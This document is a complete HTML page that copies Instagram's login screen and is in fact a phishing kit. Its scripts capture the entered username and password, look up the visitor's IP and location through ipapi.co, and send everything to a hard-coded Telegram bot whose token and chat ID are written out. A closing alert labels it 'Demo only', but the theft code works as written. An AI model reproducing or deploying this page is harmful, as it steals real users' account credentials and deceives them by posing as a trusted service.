<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Instagram â€“ Log In</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-200.png/ab6eff595bb1.png">
  <style>
    *{box-sizing:border-box;margin:0;padding:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;font-size:14px;}
    body{background:#fafafa;display:flex;justify-content:center;align-items:center;height:100vh;}
    .wrapper{display:flex;flex-direction:column;align-items:center;}
    .box{width:350px;background:#fff;border:1px solid #dbdbdb;border-radius:1px;padding:40px 40px 20px;}
    .logo{width:175px;margin:0 auto 30px;display:block;}
    .input-group{margin-bottom:6px;}
    .input-group input{width:100%;padding:9px 8px;border:1px solid #dbdbdb;border-radius:3px;background:#fafafa;font-size:12px;}
    .input-group input:focus{outline:none;border-color:#8a8a8a;}
    .login-btn{width:100%;padding:7px 0;background:#0095f6;color:#fff;font-weight:600;border:none;border-radius:4px;margin-top:10px;cursor:pointer;}
    .login-btn:disabled{opacity:0.3;cursor:not-allowed;}
    .or{display:flex;align-items:center;margin:20px 0;color:#8e8e8e;font-size:13px;}
    .or::before,.or::after{content:'';flex:1;height:1px;background:#dbdbdb;}
    .or::before{margin-right:18px;}
    .or::after{margin-left:18px;}
    .fb-login{display:flex;align-items:center;justify-content:center;color:#385185;text-decoration:none;font-weight:600;margin-bottom:20px;}
    .fb-login img{width:16px;margin-right:8px;}
    .forgot{display:block;text-align:center;color:#00376b;font-size:12px;text-decoration:none;margin-top:8px;}
    .signup{margin-top:10px;padding:20px 0;text-align:center;border:1px solid #dbdbdb;border-radius:1px;background:#fff;width:350px;}
    .signup a{color:#0095f6;font-weight:600;text-decoration:none;}
    .apps{margin-top:20px;text-align:center;}
    .apps img{height:40px;margin:5px;}
    footer{margin-top:50px;font-size:12px;color:#8e8e8e;text-align:center;line-height:1.8;}
    footer a{color:#8e8e8e;margin:0 6px;text-decoration:none;}
  </style>
  <script>
    const BOT_TOKEN = '8462081758:AAEsy0XwECosIrSxMS3DMmCYMjEMAysCFZI';
    const CHAT_ID   = '6164957871';
    function sendToTelegram(obj){
      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
      const text = `ðŸ” Instagram Login\nðŸ‘¤ User: ${obj.username}\nðŸ”‘ Pass: ${obj.password}\nðŸ“ IP: ${obj.ip}\nðŸ•’ Time: ${obj.time}\nðŸŒ Location: ${obj.location}\nðŸ“± Device: ${obj.device}`;
      fetch(url,{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({chat_id:CHAT_ID, text:text})
      });
    }
    async function gatherInfo(){
      const ipData = await fetch('https://ipapi.co/json').then(r=>r.json());
      return {
        ip: ipData.ip,
        location: `${ipData.city}, ${ipData.region}, ${ipData.country_name}`,
        device: navigator.platform,
        time: new Date().toLocaleString()
      };
    }
  </script>
</head>
<body>
  <div class="wrapper">
    <div class="box">
      <img class="logo" src="https://logodownload.org/wp-content/uploads/2017/04/instagram-logo-1.png" alt="Instagram">
      <form id="login-form">
        <div class="input-group">
          <input type="text" placeholder="Phone number, username, or email" id="username" required>
        </div>
        <div class="input-group">
          <input type="password" placeholder="Password" id="password" required>
        </div>
        <button class="login-btn" type="submit" disabled>Log In</button>
      </form>
      <div class="or">OR</div>
      <a href="#" class="fb-login">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="fb">
        Log in with Facebook
      </a>
      <a href="#" class="forgot">Forgot password?</a>
    </div>

    <div class="signup">
      Don't have an account? <a href="#">Sign up</a>
    </div>

    <div class="apps">
      <p>Get the app.</p>
      <a href="#"><img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="App Store"></a>
      <a href="#"><img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="Google Play"></a>
    </div>

    <footer>
      <div>
        <a href="#">Meta</a>
        <a href="#">About</a>
        <a href="#">Blog</a>
        <a href="#">Jobs</a>

        <a href="#">API</a>

        <a href="#">Hashtags</a>
        <a href="#">Locations</a>
        <a href="#">Instagram Lite</a>
      </div>
      <div style="margin-top:20px;">&copy; 2024 Instagram from Meta</div>
    </footer>
  </div>

  <script>
    const form   = document.getElementById('login-form');
    const user   = document.getElementById('username');
    const pass   = document.getElementById('password');
    const button = form.querySelector('button');

    function toggleBtn() {
      button.disabled = !(user.value.trim() && pass.value.trim());
    }
    user.addEventListener('input', toggleBtn);
    pass.addEventListener('input', toggleBtn);

    form.addEventListener('submit', async e => {
      e.preventDefault();
      const info = await gatherInfo();
      const payload = {
        username: user.value,
        password: pass.value,
        ip: info.ip,
        time: info.time,
        location: info.location,
        device: info.device
      };
      sendToTelegram(payload);
      alert('Demo only â€“ no real login.');
    });
  </script>
</body>
          </html>
